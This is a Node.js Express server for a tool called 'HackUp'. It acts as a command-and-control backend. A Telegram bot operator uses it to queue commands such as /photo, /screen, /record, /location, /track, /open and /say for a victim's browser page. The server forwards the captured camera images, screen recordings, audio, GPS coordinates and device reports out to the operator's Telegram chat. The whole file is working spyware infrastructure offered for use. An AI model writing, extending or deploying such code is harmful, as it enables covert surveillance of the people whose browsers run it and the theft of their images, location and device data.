require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const USE_POLLING = process.env.USE_POLLING !== 'false';
const IS_VERCEL = !!process.env.VERCEL;

app.use(cors());
app.use(express.json({ limit: '25mb' }));
app.use(express.urlencoded({ extended: true, limit: '25mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ---------- In-memory state ----------
const cmdQueue = [];
const cmdResults = {};
let lastBrowserPing = 0;
const logs = [];
const tasks = [];
const activity = [];

const tgReady = () => Boolean(BOT_TOKEN && CHAT_ID);
const tgUrl = (m) => `https://api.telegram.org/bot${BOT_TOKEN}/${m}`;
const TG_TIMEOUT = 20000;

function log(msg) {
  const e = { msg, ts: new Date().toISOString() };
  logs.unshift(e);
  if (logs.length > 200) logs.pop();
  console.log('[HackUp]', msg);
}
function addActivity(action) {
  activity.unshift({ action, timestamp: Date.now() });
  if (activity.length > 100) activity.pop();
}

async function tgSend(text) {
  if (!tgReady()) throw new Error('Telegram credentials missing');
  const r = await axios.post(tgUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: String(text).slice(0, 4000),
    parse_mode: 'HTML',
    disable_web_page_preview: true
  }, { timeout: TG_TIMEOUT });
  return r.data;
}

async function tgSendMedia(dataUrl, caption, kind) {
  if (!tgReady()) throw new Error('Telegram credentials missing');
  const m = /^data:([^;]+);base64,(.+)$/.exec(dataUrl || '');
  if (!m) throw new Error('Invalid data URL');
  const mime = m[1];
  const buf = Buffer.from(m[2], 'base64');
  if (buf.length > 50 * 1024 * 1024) throw new Error('Media >50MB');

  const map = {
    photo:    { method: 'sendPhoto',    field: 'photo',    file: 'capture.jpg' },
    video:    { method: 'sendVideo',    field: 'video',    file: 'capture.webm' },
    voice:    { method: 'sendVoice',    field: 'voice',    file: 'voice.webm' },
    audio:    { method: 'sendAudio',    field: 'audio',    file: 'audio.webm' },
    document: { method: 'sendDocument', field: 'document', file: 'file.bin' }
  };
  const k = map[kind] || map.photo;

  const boundary = '----hackup' + Date.now();
  const parts = [];
  const push = s => parts.push(Buffer.from(s, 'utf8'));
  push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`);
  if (caption) push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${String(caption).slice(0,1000)}\r\n`);
  push(`--${boundary}\r\nContent-Disposition: form-data; name="${k.field}"; filename="${k.file}"\r\nContent-Type: ${mime}\r\n\r\n`);
  parts.push(buf);
  push(`\r\n--${boundary}--\r\n`);
  const body = Buffer.concat(parts);

  const r = await axios.post(tgUrl(k.method), body, {
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Content-Length': body.length
    },
    timeout: 90000, maxBodyLength: Infinity, maxContentLength: Infinity
  });
  return r.data;
}

async function tgSendLocation(lat, lon) {
  if (!tgReady()) throw new Error('Telegram credentials missing');
  const r = await axios.post(tgUrl('sendLocation'), {
    chat_id: CHAT_ID, latitude: lat, longitude: lon
  }, { timeout: TG_TIMEOUT });
  return r.data;
}

// ---------- Command handling ----------
const SIMPLE_COMMANDS = {
  '/photo': () => ({ type: 'photo' }),
  '/screen': () => ({ type: 'screen' }),
  '/record3': () => ({ type: 'record3' }),
  '/record5': () => ({ type: 'record5' }),
  '/location': () => ({ type: 'location' }),
  '/track': () => ({ type: 'track' }),
  '/report': () => ({ type: 'report' }),
  '/battery': () => ({ type: 'battery' }),
  '/network': () => ({ type: 'network' }),
  '/sensors': () => ({ type: 'sensors' }),
  '/storage': () => ({ type: 'storage' }),
  '/vibrate': () => ({ type: 'vibrate' }),
  '/fullscreen': () => ({ type: 'fullscreen' })
};

function queueCommand(cmd) {
  const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
  cmdQueue.push({ id, cmd, ts: Date.now() });
  log(`Queued: ${JSON.stringify(cmd)}`);
  return id;
}

async function handleTelegramUpdate(update) {
  const msg = update.message || update.edited_message;
  if (!msg || !msg.text) return;
  const text = msg.text.trim();
  const fromId = String(msg.chat.id);
  if (CHAT_ID && fromId !== String(CHAT_ID)) return;

  if (text === '/start' || text === '/help') {
    await tgSend(
      '🤖 <b>HackUp Remote Control</b>\n' +
      '━━━━━━━━━━━━━━━━━━━━\n' +
      '📷 /photo · 🖥️ /screen · 🎥 /record3 · 🎙️ /record5\n' +
      '📍 /location · 🛰️ /track\n' +
      '📊 /report · 🔋 /battery · 📶 /network · 🎯 /sensors · 💾 /storage\n' +
      '📳 /vibrate · ⛶ /fullscreen\n' +
      '🔊 /say &lt;text&gt; · 🔗 /open &lt;url&gt; · 🔔 /notify &lt;msg&gt;\n' +
      '📡 /status · 📜 /logs'
    );
    return;
  }
  if (text === '/status') {
    const alive = Date.now() - lastBrowserPing < 20000;
    await tgSend(`📡 Browser: ${alive ? '🟢 Online' : '🔴 Offline (WebApp খুলুন)'}\nQueue: ${cmdQueue.length}`);
    return;
  }
  if (text === '/logs') {
    const recent = logs.slice(0, 10).map(l => `• ${l.msg}`).join('\n') || 'None';
    await tgSend(`<b>Logs:</b>\n${recent}`);
    return;
  }
  if (SIMPLE_COMMANDS[text]) {
    queueCommand(SIMPLE_COMMANDS[text]());
    await tgSend(`✅ Queued <b>${text}</b>`);
    return;
  }
  if (text.startsWith('/say '))    { queueCommand({ type: 'say',    text: text.slice(5) });   await tgSend('✅ Queued /say'); return; }
  if (text.startsWith('/open '))   { queueCommand({ type: 'open',   url: text.slice(6) });    await tgSend('✅ Queued /open'); return; }
  if (text.startsWith('/notify ')) { queueCommand({ type: 'notify', text: text.slice(8) });   await tgSend('✅ Queued /notify'); return; }

  await tgSend(`❓ Unknown: ${text}\n/help দিন।`);
}

// ---------- API Routes ----------
app.get('/api/health', (_, res) => res.json({
  ok: true,
  telegramConfigured: tgReady(),
  browserOnline: Date.now() - lastBrowserPing < 20000,
  queued: cmdQueue.length,
  uptime: process.uptime()
}));

app.post('/api/commands/result', async (req, res) => {
  const { id, result, forward } = req.body || {};
  if (id) cmdResults[id] = { result, ts: Date.now() };
  if (forward && result) { try { await tgSend(result); } catch {} }
  res.json({ ok: true });
});

app.get('/api/commands/poll', (_, res) => {
  lastBrowserPing = Date.now();
  const cmds = cmdQueue.splice(0, cmdQueue.length);
  res.json({ commands: cmds, ok: true });
});

app.post('/api/upload', async (req, res) => {
  try {
    const { image, caption, kind } = req.body || {};
    if (!image) return res.status(400).json({ error: 'image required' });
    const r = await tgSendMedia(image, caption || '📸 Capture', kind || 'photo');
    res.json({ success: r.ok === true });
  } catch (e) {
    console.error('upload', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/telegram/location', async (req, res) => {
  try {
    const { latitude, longitude, caption } = req.body || {};
    if (typeof latitude !== 'number' || typeof longitude !== 'number')
      return res.status(400).json({ error: 'lat/lon required' });
    const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
    await tgSend(
      `${caption || '📍 Location'}\n` +
      `Lat: <code>${latitude.toFixed(6)}</code>\n` +
      `Lon: <code>${longitude.toFixed(6)}</code>\n` +
      `<a href="${maps}">🗺️ Open Maps</a>`
    );
    await tgSendLocation(latitude, longitude);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/telegram/message', async (req, res) => {
  try {
    const r = await tgSend(req.body.text || '');
    res.json({ success: r.ok === true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/telegram/report', async (req, res) => {
  try {
    const d = req.body || {};
    const lines = ['📊 <b>Device Report</b>', `<b>Time:</b> ${new Date().toLocaleString()}`, ''];
    Object.keys(d).forEach(k => {
      let v = d[k];
      if (v === null || v === undefined || v === '') return;
      if (typeof v === 'object') v = JSON.stringify(v);
      lines.push(`<b>${k}:</b> <code>${String(v).slice(0,500)}</code>`);
    });
    const r = await tgSend(lines.join('\n'));
    res.json({ success: r.ok === true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/telegram/test', async (_, res) => {
  try { await tgSend('✅ HackUp test message'); res.json({ success: true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/send-all', async (_, res) => {
  try { const r = await tgSend('📤 HackUp send-all test'); res.json({ success: r.ok === true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

// Tasks (dashboard)
app.get('/api/tasks', (_, res) => res.json(tasks));
app.post('/api/tasks', (req, res) => {
  const { title } = req.body || {};
  if (!title) return res.status(400).json({ error: 'title required' });
  const task = { id: Date.now().toString(36), title, completed: false };
  tasks.push(task);
  addActivity(`Task created: ${title}`);
  res.json(task);
});
app.put('/api/tasks/:id', (req, res) => {
  const t = tasks.find(x => x.id === req.params.id);
  if (!t) return res.status(404).json({ error: 'not found' });
  if (typeof req.body.completed === 'boolean') t.completed = req.body.completed;
  if (typeof req.body.title === 'string') t.title = req.body.title;
  addActivity(`Task updated: ${t.title}`);
  res.json(t);
});
app.delete('/api/tasks/:id', (req, res) => {
  const i = tasks.findIndex(x => x.id === req.params.id);
  if (i < 0) return res.status(404).json({ error: 'not found' });
  const [t] = tasks.splice(i, 1);
  addActivity(`Task deleted: ${t.title}`);
  res.json({ ok: true });
});
app.get('/api/activity', (_, res) => res.json(activity));

// Webhook (optional path)
app.post('/api/telegram/webhook', async (req, res) => {
  try { await handleTelegramUpdate(req.body); res.json({ ok: true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/telegram/set-webhook', async (req, res) => {
  try {
    const host = req.query.url || `https://${req.headers.host}`;
    const wh = `${host}/api/telegram/webhook`;
    const r = await axios.post(tgUrl('setWebhook'),
      { url: wh, drop_pending_updates: true }, { timeout: TG_TIMEOUT });
    res.json({ success: true, webhook: wh, telegram: r.data });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.use((err, req, res, next) => {
  console.error('Error:', err.message);
  res.status(500).json({ error: err.message || 'Server error' });
});

// ---------- Telegram Long Polling (works on persistent hosts) ----------
let polling = false;
let lastUpdateId = 0;
async function startTelegramPolling() {
  if (polling || !BOT_TOKEN) return;
  polling = true;
  try {
    await axios.post(tgUrl('deleteWebhook'), { drop_pending_updates: false }, { timeout: TG_TIMEOUT });
    log('Webhook cleared → long-polling ON');
  } catch (e) { log('deleteWebhook failed: ' + e.message); }

  while (polling) {
    try {
      const r = await axios.get(tgUrl('getUpdates'), {
        params: { offset: lastUpdateId + 1, timeout: 25, allowed_updates: ['message', 'edited_message'] },
        timeout: 35000
      });
      const updates = (r.data && r.data.result) || [];
      for (const u of updates) {
        lastUpdateId = u.update_id;
        try { await handleTelegramUpdate(u); }
        catch (e) { log('handle error: ' + e.message); }
      }
    } catch (e) {
      log('Poll error: ' + e.message);
      await new Promise(r => setTimeout(r, 3000));
    }
  }
}

if (require.main === module && !IS_VERCEL) {
  app.listen(PORT, () => {
    console.log(`🚀 HackUp → http://localhost:${PORT}`);
    if (USE_POLLING) startTelegramPolling();
  });
}
module.exports = app;
